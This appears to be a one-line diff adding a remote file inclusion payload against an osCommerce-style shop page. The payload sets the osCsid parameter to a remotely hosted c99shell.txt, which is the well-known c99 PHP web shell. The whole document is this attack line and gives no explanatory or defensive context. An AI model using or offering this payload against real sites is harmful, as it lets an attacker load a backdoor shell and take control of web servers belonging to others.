@@ -1,0 +1,1 @@
+http://www.example.com/shop/page.php?osCsid=http://yoursite/c99shell.txt?
